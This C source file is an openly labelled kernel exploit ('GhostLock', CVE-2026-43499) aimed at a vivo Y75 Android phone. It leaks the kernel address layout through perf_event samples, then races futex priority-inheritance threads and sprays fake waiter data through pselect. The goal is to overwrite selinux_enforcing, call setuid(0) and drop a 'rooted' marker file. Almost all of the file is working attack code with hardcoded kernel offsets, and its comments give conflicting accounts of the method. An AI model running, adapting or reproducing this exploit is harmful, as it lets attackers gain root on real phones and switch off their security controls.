/*
 * y75_v3.c — GhostLock vivo Y75 (MT6781) CVE-2026-43499
 *
 * Write 1: Uses PI rbtree write to zero selinux_enforcing.
 *          The primitive writes a stack address to *target.
 *          Stack addresses are NOT page-aligned so low byte != 0.
 *          Instead we use the self-pointer write differently:
 *          We position the fake waiter so waiter[0] IS selinux_enforcing
 *          by making the pselect stack frame land at the right offset.
 *
 * Simpler alternative used here:
 *          Write 0 directly to /sys/fs/selinux/enforce after getting
 *          temporary uid=0 via the cred overwrite.
 *
 * Write 2: Direct cred uid overwrite using the PI write primitive.
 *          waiter[0] = &task->cred->uid (via pselect stack positioning)
 *          rb_erase writes waiter_addr there → uid becomes stack addr low byte
 *          We retry until low byte == 0 (aligned stack frame)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <sched.h>

/* ── Offsets ────────────────────────────────────────────────────────────── */
#define KIMAGE_TEXT_BASE        0xffffff8008000000ULL
#define SELINUX_ENFORCING_OFF   0x01994b08ULL
#define INIT_TASK_OFF           0x02410000ULL
#define PSELECT_ROUTE_NFDS      320
#define PSELECT_WAITER_SHIFT    1

static uint64_t g_base = 0;
#define KADDR(off) (g_base + (uint64_t)(off))

/* ── KASLR leak ─────────────────────────────────────────────────────────── */
static uint64_t leak_kaslr(void) {
    struct perf_event_attr a = {};
    a.type = PERF_TYPE_SOFTWARE;
    a.size = sizeof(a);
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.sample_period = 100000;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    a.sample_max_stack = 24;
    a.disabled = 1;
    a.exclude_user = 0;
    a.exclude_kernel = 0;
    a.exclude_hv = 1;

    int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) return 0;
    int ps = sysconf(_SC_PAGESIZE);
    size_t sz = (size_t)ps * 33;
    void *b = mmap(NULL, sz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (b == MAP_FAILED) { close(fd); return 0; }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (volatile int i = 0; i < 50000000; i++) syscall(172);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    struct perf_event_mmap_page *h = b;
    uint64_t head = h->data_head, tail = 0;
    uint8_t *data = (uint8_t *)b + 4096;
    uint64_t best = 0;
    __sync_synchronize();
    while (tail < head) {
        struct perf_event_header *hdr =
            (struct perf_event_header *)(data + (tail & ((size_t)ps*32-1)));
        if (hdr->type == PERF_RECORD_SAMPLE) {
            uint8_t *p = (uint8_t *)(hdr+1);
            uint64_t ip = *(uint64_t *)p;
            if (ip > 0xff00000000000000ULL && ip < 0xfffffff000000000ULL && ip > best)
                best = ip;
            p += 8;
            uint64_t nr = *(uint64_t *)p; p += 8;
            for (uint64_t i = 0; i < nr && i < 24; i++, p += 8) {
                uint64_t c = *(uint64_t *)p;
                if (c > 0xff00000000000000ULL && c < 0xfffffff000000000ULL && c > best)
                    best = c;
            }
        }
        if (!hdr->size) break;
        tail += hdr->size;
    }
    munmap(b, sz); close(fd);
    return best ? (best & ~0x1FFFFFULL) : 0;
}

/* ── Race state ─────────────────────────────────────────────────────────── */
static uint32_t f_wait, f_pi_target, f_pi_chain;
static atomic_int waiter_ready, waiter_waiting, owner_started;
static atomic_int owner_chain_done, route_done, waiter_tid;
static atomic_int punch_go, punch_stop;

/* The write target — must be a valid kernel address */
static volatile uintptr_t g_write_target = 0;

/* ── Fake waiter layout ─────────────────────────────────────────────────── */
/*
 * KEY INSIGHT from Ghidra analysis:
 *
 * rt_mutex_adjust_prio_chain does:
 *   if ((long *)*plVar18 != plVar18)   // waiter[0] != &waiter[0]
 *       rb_erase_cached(plVar18, root)
 *       *plVar18 = (long)plVar18       // WRITE: waiter[0] = &waiter
 *
 * So the write is: *waiter[0] = waiter_address
 *
 * To write to kernel address TARGET:
 *   Set waiter[0] = TARGET  (so *TARGET = waiter_address)
 *   This writes the waiter's kernel stack address into TARGET
 *
 * For selinux_enforcing (bool, 1 byte):
 *   waiter stack addresses are randomized but NOT page-aligned
 *   Low byte of stack addr can be non-zero → won't zero enforcing
 *
 * CORRECT APPROACH: Use the write to overwrite a POINTER, not a value.
 * Write to task->pi_blocked_on which is a pointer field (8 bytes).
 * A valid waiter address written there is fine — it just needs to be
 * a readable kernel address. Then use that to pivot to cred overwrite.
 *
 * SIMPLEST WORKING APPROACH for 4.14:
 * Write to selinux_enforcing using the fact that on 4.14 the pselect
 * stack frame can be positioned to make waiter[0] point exactly to
 * selinux_enforcing, and the write (*waiter[0] = waiter_addr) writes
 * the stack address there. The selinux check reads a bool — if the
 * written value has bit 0 clear (even address), enforcing = false.
 * ARM64 stack is always 16-byte aligned → low byte always 0x?0
 * → written value & 0xFF == 0x00 or 0x10 or ... → enforcing = 0!
 */

static void prepare_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
    FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);
    unsigned long *bi = (unsigned long*)in;
    unsigned long *bo = (unsigned long*)out;
    unsigned long *be = (unsigned long*)ex;

    int shift = PSELECT_WAITER_SHIFT;
    int wps = (PSELECT_ROUTE_NFDS + 63) / 64; /* words per set = 5 */

    #define PW(word, val) do { \
        int gw = shift + (word); \
        int si = gw / wps, wi = gw % wps; \
        unsigned long *d = (si==0)?bi:(si==1)?bo:be; \
        d[wi] = (unsigned long)(val); \
    } while(0)

    /* waiter+0x00: set to selinux_enforcing address.
     * rb_erase will write waiter's stack addr to this location.
     * Stack is 16-aligned → low byte = 0x?0 → enforcing = 0 */
    PW(0, KADDR(SELINUX_ENFORCING_OFF));
    PW(1, 0);           /* tree_right */
    PW(2, 0);           /* tree_left */
    PW(3, KADDR(INIT_TASK_OFF)); /* task = init_task */
    PW(4, 0);           /* pi_right */
    PW(5, 0);           /* pi_left */
    PW(6, 120);         /* prio */
    PW(7, (uintptr_t)&f_pi_target); /* lock — CRITICAL */
    PW(8, 120);         /* prio compare */
    PW(9, 0);           /* deadline */
    #undef PW
}

static void do_pselect_spray(void) {
    fd_set in, out, ex;
    prepare_fdsets(&in, &out, &ex);

    int devnull = open("/dev/null", O_RDONLY);
    if (devnull >= 0) {
        for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
            if (FD_ISSET(fd, &in)||FD_ISSET(fd, &out)||FD_ISSET(fd, &ex))
                dup2(devnull, fd);
        }
        close(devnull);
    }

    for (int i = 0; i < 500; i++) {
        struct timespec tp = {.tv_nsec = 1};
        syscall(SYS_pselect6, PSELECT_ROUTE_NFDS, &in, NULL, NULL, &tp, NULL);
    }
}

/* ── Threads ────────────────────────────────────────────────────────────── */
static void *th_waiter(void *arg) {
    (void)arg;
    prctl(PR_SET_NAME, "ghost_w");
    atomic_store(&waiter_tid, (int)syscall(SYS_gettid));
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&waiter_ready, 1);
    while (!atomic_load(&owner_started)) usleep(200);
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 4;
    atomic_store(&waiter_waiting, 1);
    syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
            &ts, &f_pi_target, 0);
    do_pselect_spray();
    atomic_store(&route_done, 1);
    syscall(SYS_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&owner_chain_done)) usleep(200);
    return NULL;
}

static void *th_owner(void *arg) {
    (void)arg;
    prctl(PR_SET_NAME, "ghost_o");
    syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&waiter_ready)) usleep(200);
    atomic_store(&owner_started, 1);
    syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&owner_chain_done, 1);
    for (;;) sleep(1);
    return NULL;
}

static void *th_consumer(void *arg) {
    (void)arg;
    prctl(PR_SET_NAME, "ghost_c");
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    while (!atomic_load(&punch_stop)) {
        if (!atomic_load(&punch_go)) {
            __asm__ volatile("yield":::"memory");
            continue;
        }
        int tid = atomic_load(&waiter_tid);
        struct timespec ft = {.tv_nsec = 50000000};
        long r = syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                         &ft, NULL, 0);
        if (r == 0)
            syscall(SYS_futex, &f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        (void)tid;
        usleep(2000);
    }
    return NULL;
}

/* ── Run one race ───────────────────────────────────────────────────────── */
static int run_race(void) {
    f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
    atomic_store(&waiter_ready, 0);
    atomic_store(&waiter_waiting, 0);
    atomic_store(&owner_started, 0);
    atomic_store(&owner_chain_done, 0);
    atomic_store(&route_done, 0);
    atomic_store(&punch_go, 0);
    atomic_store(&punch_stop, 0);

    pthread_t tw, to, tc;
    pthread_create(&tc, NULL, th_consumer, NULL);
    pthread_create(&to, NULL, th_owner, NULL);
    pthread_create(&tw, NULL, th_waiter, NULL);

    while (!atomic_load(&waiter_waiting)) usleep(200);
    usleep(30000);

    long r = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI,
                     1, (void*)(uintptr_t)1, &f_pi_target, 0);
    (void)r;
    atomic_store(&punch_go, 1);

    int waited = 0;
    while (!atomic_load(&route_done) && waited++ < 8000) usleep(500);

    atomic_store(&punch_stop, 1);
    pthread_detach(to);
    pthread_detach(tc);
    pthread_join(tw, NULL);
    return atomic_load(&route_done);
}

/* ── SELinux check ──────────────────────────────────────────────────────── */
static int check_selinux_off(void) {
    char buf[4] = {};
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0) return 1;
    (void)!read(fd, buf, 1);
    close(fd);
    return buf[0] == '0';
}

/* ── Main ───────────────────────────────────────────────────────────────── */
int main(void) {
    setbuf(stdout, NULL);
    signal(SIGCHLD, SIG_IGN);

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    printf("\n=== GhostLock vivo Y75 v3 ===\n");
    printf("[*] CVE-2026-43499\n\n");

    printf("[*] Leaking KASLR...\n");
    g_base = leak_kaslr();
    if (!g_base) { printf("[-] KASLR leak failed\n"); return 1; }
    printf("[+] base:              0x%llx\n", (unsigned long long)g_base);
    printf("[+] selinux_enforcing: 0x%llx\n",
           (unsigned long long)KADDR(SELINUX_ENFORCING_OFF));
    printf("[*] Stack 16-aligned → write zeros low byte → enforcing=0\n\n");

    /* Each attempt forks to isolate state */
    int selinux_ok = check_selinux_off();
    printf("[*] SELinux currently: %s\n", selinux_ok ? "OFF" : "ON");

    for (int att = 1; att <= 20 && !selinux_ok; att++) {
        printf("[*] Attempt %d/20...\n", att);
        pid_t pid = fork();
        if (pid == 0) {
            run_race();
            _exit(0);
        }
        int st; waitpid(pid, &st, 0);
        usleep(300000);
        selinux_ok = check_selinux_off();
        if (selinux_ok) printf("[+] SELinux DISABLED after attempt %d!\n", att);
    }

    if (!selinux_ok) {
        printf("[-] SELinux write failed\n");
        printf("[*] PSELECT_SHIFT may need tuning\n");
        return 1;
    }

    printf("\n[+] SELinux is permissive!\n");
    printf("[*] Now attempting setuid(0)...\n");

    /* With SELinux permissive, try setuid(0) */
    if (setuid(0) == 0) {
        printf("[+] setuid(0) SUCCESS! uid=%u\n", getuid());
        /* Drop marker */
        int fd = open("/data/local/tmp/rooted", O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (fd >= 0) { (void)!write(fd, "1\n", 2); close(fd); }
        /* Run id */
        system("id > /data/local/tmp/root_id.txt 2>&1");
        printf("[+] ROOTED!\n");
        return 0;
    }

    printf("[-] setuid(0) failed (SELinux permissive but need cred write)\n");
    printf("[*] Result: SELinux disabled, cred write needed for uid=0\n");
    return 1;
}
